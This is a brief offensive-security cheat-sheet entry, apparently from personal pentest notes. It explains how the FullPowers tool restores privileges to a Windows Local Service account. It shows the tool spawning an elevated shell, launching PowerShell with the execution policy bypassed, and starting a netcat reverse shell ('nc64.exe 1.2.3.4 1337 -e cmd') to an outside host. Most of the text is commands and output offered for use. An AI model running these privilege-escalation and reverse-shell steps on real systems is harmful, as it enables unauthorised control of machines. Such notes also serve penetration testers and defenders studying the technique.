
# Local Service Account

---

When being an Local Service Account ur permissions are usually restricted/negated.

```
SHELL> whoami
nt authority\local service
SHELL> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State   
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
SeCreateGlobalPrivilege       Create global objects          Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

But we can utilize an tool called "FullPowers" in order to restore them.


## Basic usage

```
c:\TOOLS>FullPowers
[+] Successfully created scheduled task. PID=9976
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.19041.84]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\WINDOWS\system32>
```

## Specify a custom command line

```
c:\TOOLS>FullPowers -c "powershell -ep Bypass"
[+] Successfully created scheduled task. PID=9028
[+] CreateProcessAsUser() OK
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

PS C:\WINDOWS\system32> Get-ExecutionPolicy
Bypass
```

### Start a netcat reverse shell and exit

```
c:\TOOLS>FullPowers -c "C:\TOOLS\nc64.exe 1.2.3.4 1337 -e cmd" -z
[+] Successfully created scheduled task. PID=5482
[+] CreateProcessAsUser() OK
```